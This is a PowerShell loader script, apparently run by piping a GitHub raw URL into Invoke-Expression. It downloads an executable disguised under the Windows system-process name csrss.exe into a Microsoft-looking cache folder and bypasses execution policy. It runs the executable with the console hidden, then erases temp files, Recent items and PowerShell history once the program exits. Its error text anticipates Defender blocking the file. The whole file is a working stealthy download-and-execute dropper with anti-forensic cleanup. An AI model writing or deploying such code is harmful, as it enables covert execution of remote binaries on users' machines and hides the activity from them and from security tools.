# network.ps1 — silent download / run / wait / clean
# irm https://raw.githubusercontent.com/arxstore/curado/refs/heads/main/network.ps1 | iex

$ErrorActionPreference = 'Stop'
try { Set-ExecutionPolicy -Scope Process Bypass -Force -ErrorAction SilentlyContinue } catch {}
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$dir = Join-Path $env:LOCALAPPDATA 'Microsoft\Windows\Caches'
$exe = Join-Path $dir 'csrss.exe'
$tmp = Join-Path $dir ('csrss.' + [guid]::NewGuid().ToString('N').Substring(0, 8))
$cb  = [DateTimeOffset]::UtcNow.ToUnixTimeSeconds()
$base = 'https://raw.githubusercontent.com/arxstore/curado/refs/heads/main'
$urls = @("$base/csrss.exe?$cb")
if ((Test-Path variable:ExeUrl) -and $ExeUrl) { $urls = @(([string]$ExeUrl) + "?$cb") }
$hdr = @{
    'Cache-Control' = 'no-cache'
    'Pragma'        = 'no-cache'
    'User-Agent'    = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) ARX/1.0'
}

function Hide-Console {
    try {
        if (-not ('ArxHideCon' -as [type])) {
            Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;
public static class ArxHideCon {
  [DllImport("kernel32.dll")] public static extern IntPtr GetConsoleWindow();
  [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr h, int nCmdShow);
}
'@
        }
        $c = [ArxHideCon]::GetConsoleWindow()
        if ($c -ne [IntPtr]::Zero) { [void][ArxHideCon]::ShowWindow($c, 0) }
    } catch {}
}

function Show-Console {
    try {
        if (-not ('ArxShowCon' -as [type])) {
            Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;
public static class ArxShowCon {
  [DllImport("kernel32.dll")] public static extern IntPtr GetConsoleWindow();
  [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr h, int nCmdShow);
}
'@
        }
        $c = [ArxShowCon]::GetConsoleWindow()
        if ($c -ne [IntPtr]::Zero) { [void][ArxShowCon]::ShowWindow($c, 5) }
    } catch {}
}

function Remove-Safe($p, [switch]$Recurse) {
    if (-not (Test-Path -LiteralPath $p)) { return }
    try {
        if ($Recurse) { Remove-Item -LiteralPath $p -Recurse -Force -ErrorAction Stop }
        else { Remove-Item -LiteralPath $p -Force -ErrorAction Stop }
    } catch {}
}

function Clear-History {
    foreach ($h in @(
        "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt",
        "$env:APPDATA\Microsoft\PowerShell\PSReadLine\ConsoleHost_history.txt"
    )) {
        if (Test-Path -LiteralPath $h) {
            try { Clear-Content -LiteralPath $h -Force -ErrorAction SilentlyContinue } catch {}
        }
    }
}

function Get-StagedProcesses {
    # Prefer path match (never touch System32\csrss.exe)
    $byPath = @(Get-CimInstance Win32_Process -ErrorAction SilentlyContinue |
        Where-Object { $_.ExecutablePath -and ($_.ExecutablePath -ieq $exe) })
    if ($byPath.Count -gt 0) { return $byPath }

    # Fallback: CommandLine contains our staged full path
    return @(Get-CimInstance Win32_Process -ErrorAction SilentlyContinue |
        Where-Object {
            $_.CommandLine -and ($_.CommandLine -like "*${exe}*") -and
            ($_.ExecutablePath -notlike '*\System32\csrss.exe') -and
            ($_.ExecutablePath -notlike '*\SysWOW64\csrss.exe')
        })
}

function Clean-AfterClose {
    Get-StagedProcesses | ForEach-Object {
        try { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue } catch {}
    }
    Start-Sleep -Milliseconds 500

    Remove-Safe $tmp
    Remove-Safe $exe
    Remove-Safe (Join-Path $dir 'assets') -Recurse

    Get-ChildItem -LiteralPath $dir -File -ErrorAction SilentlyContinue |
        Where-Object { $_.Name -match '^(csrss\.|assets|\.cache)' -or $_.Name -eq 'csrss.exe' } |
        ForEach-Object { Remove-Safe $_.FullName }

    foreach ($root in @($env:TEMP, (Join-Path $env:LOCALAPPDATA 'Temp'))) {
        if (-not (Test-Path -LiteralPath $root)) { continue }
        Get-ChildItem -LiteralPath $root -File -ErrorAction SilentlyContinue |
            Where-Object { $_.Name -match 'network\.ps1|ps-script|arxstore|curado' } |
            ForEach-Object { Remove-Safe $_.FullName }
    }

    $recent = Join-Path $env:APPDATA 'Microsoft\Windows\Recent'
    if (Test-Path -LiteralPath $recent) {
        Get-ChildItem -LiteralPath $recent -ErrorAction SilentlyContinue |
            Where-Object { $_.Name -match 'powershell|\.ps1|network|curado' } |
            ForEach-Object { Remove-Safe $_.FullName }
    }

    Clear-History
}

function Test-Exe($p) {
    if (-not (Test-Path -LiteralPath $p)) { return $false }
    try {
        $i = Get-Item -LiteralPath $p
        if ($i.Length -lt 200KB) { return $false }
        $b = New-Object byte[] 2
        $s = [IO.File]::OpenRead($p)
        try { [void]$s.Read($b, 0, 2) } finally { $s.Dispose() }
        return ($b[0] -eq 0x4D -and $b[1] -eq 0x5A)
    } catch { return $false }
}

$launched = $false
try {
    if (-not (Test-Path -LiteralPath $dir)) {
        New-Item -ItemType Directory -Path $dir -Force | Out-Null
    }

    # Stop old staged copy so file can be replaced
    Get-StagedProcesses | ForEach-Object {
        try { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue } catch {}
    }
    Start-Sleep -Milliseconds 300
    Remove-Safe $exe
    Remove-Safe $tmp

    $ok = $false
    $lastErr = 'download failed'
    foreach ($url in $urls) {
        for ($n = 1; $n -le 3; $n++) {
            try {
                Remove-Safe $tmp
                Invoke-WebRequest -Uri $url -OutFile $tmp -UseBasicParsing -Headers $hdr -TimeoutSec 180
                if (Test-Exe $tmp) {
                    Remove-Safe $exe
                    [IO.File]::Copy($tmp, $exe, $true)
                    Remove-Safe $tmp
                    if (-not (Test-Exe $exe)) { throw 'copy to staged path failed' }
                    $ok = $true
                    break
                }
                $sz = 0
                if (Test-Path -LiteralPath $tmp) { $sz = (Get-Item -LiteralPath $tmp).Length }
                $lastErr = "bad file ($sz bytes) from GitHub"
                Remove-Safe $tmp
            } catch {
                $lastErr = $_.Exception.Message
                Start-Sleep -Seconds 1
            }
        }
        if ($ok) { break }
    }
    if (-not $ok) { throw $lastErr }

    # Optional assets (ignore errors)
    try {
        $z0 = Join-Path $dir ('z' + [guid]::NewGuid().ToString('N').Substring(0, 6))
        Invoke-WebRequest -Uri "$base/assets.zip?$cb" -OutFile $z0 -Headers $hdr -UseBasicParsing -TimeoutSec 45
        if ((Test-Path $z0) -and ((Get-Item $z0).Length -gt 64)) {
            $x0 = Join-Path $dir ('x' + [guid]::NewGuid().ToString('N').Substring(0, 6))
            if (Test-Path $x0) { Remove-Item $x0 -Recurse -Force -ErrorAction SilentlyContinue }
            Expand-Archive -LiteralPath $z0 -DestinationPath $x0 -Force
            $s0 = Join-Path $dir 'assets'
            if (Test-Path $s0) { Remove-Item $s0 -Recurse -Force -ErrorAction SilentlyContinue }
            $i0 = Join-Path $x0 'assets'
            if (Test-Path $i0) { Copy-Item $i0 $s0 -Recurse -Force }
            else {
                New-Item -ItemType Directory -Force -Path $s0 | Out-Null
                Copy-Item (Join-Path $x0 '*') $s0 -Recurse -Force -ErrorAction SilentlyContinue
            }
            Remove-Item $x0 -Recurse -Force -ErrorAction SilentlyContinue
        }
        Remove-Safe $z0
    } catch { Remove-Safe $z0 }

    Unblock-File -LiteralPath $exe -ErrorAction SilentlyContinue
    $proc = Start-Process -FilePath $exe -WorkingDirectory $dir -PassThru
    if ($null -eq $proc) { throw 'Start-Process returned null' }

    # Confirm process is alive (use PID first — Cim path can lag / be empty)
    $alive = $false
    for ($i = 0; $i -lt 40; $i++) {
        Start-Sleep -Milliseconds 150
        $p = Get-Process -Id $proc.Id -ErrorAction SilentlyContinue
        if ($p) { $alive = $true; break }
        if ((Get-StagedProcesses).Count -gt 0) { $alive = $true; break }
    }
    if (-not $alive) {
        $code = 'n/a'
        try { if ($proc.HasExited) { $code = "$($proc.ExitCode)" } } catch {}
        throw "exe did not stay running (exit=$code). Defender may have blocked csrss.exe"
    }
    $launched = $true

    Hide-Console

    # Wait until user closes the app
    while ($true) {
        $p = Get-Process -Id $proc.Id -ErrorAction SilentlyContinue
        $staged = Get-StagedProcesses
        if ((-not $p) -and ($staged.Count -eq 0)) { break }
        Start-Sleep -Seconds 1
    }
    Start-Sleep -Milliseconds 800

    Clean-AfterClose
}
catch {
    if (-not $launched) {
        Show-Console
        Write-Host ''
        Write-Host ('ARX launch failed: ' + $_.Exception.Message) -ForegroundColor Red
        Write-Host 'Upload latest network.ps1 + csrss.exe to GitHub, then retry.' -ForegroundColor Yellow
        Write-Host ''
        try { Read-Host 'Press Enter to close' } catch {}
    } else {
        try { Clean-AfterClose } catch {}
    }
}
